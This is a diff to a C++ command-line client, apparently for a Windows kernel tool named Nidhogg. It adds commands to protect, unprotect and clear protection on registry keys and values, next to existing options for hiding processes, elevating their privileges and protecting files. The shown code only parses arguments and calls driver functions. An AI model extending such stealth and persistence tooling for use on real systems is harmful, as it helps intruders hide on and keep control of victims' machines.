@@ -5,7 +5,7 @@
 
 enum class Options {
 	Unknown,
-	Add, Remove, List, Clear, Hide, Elevate
+	Add, Remove, Clear, Hide, Elevate
 };
 
 int Error(int errorCode) {
@@ -30,7 +30,8 @@ int Error(int errorCode) {
 int PrintUsage() {
 	std::cout << "[ * ] Possible usage:" << std::endl;
 	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate] [pid| pid1 pid2...]" << std::endl;
-	std::cout << "\tNidhoggClient.exe file [add | remove | clear] path" << std::endl;
+	std::cout << "\tNidhoggClient.exe file [add | remove | clear] [path]" << std::endl;
+	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide] [key] [value]" << std::endl;
 	return 0;
 }
 
@@ -74,6 +75,14 @@ int wmain(int argc, const wchar_t* argv[]) {
 		else if (_wcsicmp(argv[1], L"file") == 0) {
 			success = NidhoggFileProtect(_wcsdup(argv[3]));
 		}
+		else if (_wcsicmp(argv[1], L"reg") == 0) {
+			if (argc == 5) {
+				success = NidhoggRegistryProtectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
+			}
+			else {
+				success = NidhoggRegistryProtectKey(_wcsdup(argv[3]));
+			}
+		}
 		break;
 	}
 	case Options::Remove:
@@ -85,6 +94,14 @@ int wmain(int argc, const wchar_t* argv[]) {
 		else if (_wcsicmp(argv[1], L"file") == 0) {
 			success = NidhoggFileUnprotect(_wcsdup(argv[3]));
 		}
+		else if (_wcsicmp(argv[1], L"reg") == 0) {
+			if (argc == 5) {
+				success = NidhoggRegistryUnprotectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
+			}
+			else {
+				success = NidhoggRegistryUnprotectKey(_wcsdup(argv[3]));
+			}
+		}
 		break;
 	}
 	case Options::Clear:
@@ -94,7 +111,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 		else if (_wcsicmp(argv[1], L"file") == 0) {
 			success = NidhoggFileClearAllProtection();
 		}
-
+		else if (_wcsicmp(argv[1], L"reg") == 0) {
+			success = NidhoggRegistryClearAllProtection();
+		}
 		break;
 	}
 	case Options::Hide:
@@ -108,7 +127,11 @@ int wmain(int argc, const wchar_t* argv[]) {
 			PrintUsage();
 			return 1;
 		}
-
+		else if (_wcsicmp(argv[1], L"reg") == 0) {
+			std::cerr << "[ - ] TBA" << std::endl;
+			PrintUsage();
+			return 1;
+		}
 		break;
 	}
 	case Options::Elevate:
@@ -118,6 +141,11 @@ int wmain(int argc, const wchar_t* argv[]) {
 			success = NidhoggProcessElevate(pids);
 		}
 		else if (_wcsicmp(argv[1], L"file") == 0) {
+			std::cerr << "[ - ] Invalid option!" << std::endl;
+			PrintUsage();
+			return 1;
+		}
+		else if (_wcsicmp(argv[1], L"reg") == 0) {
 			std::cerr << "[ - ] Invalid option!" << std::endl;
 			PrintUsage();
 			return 1;
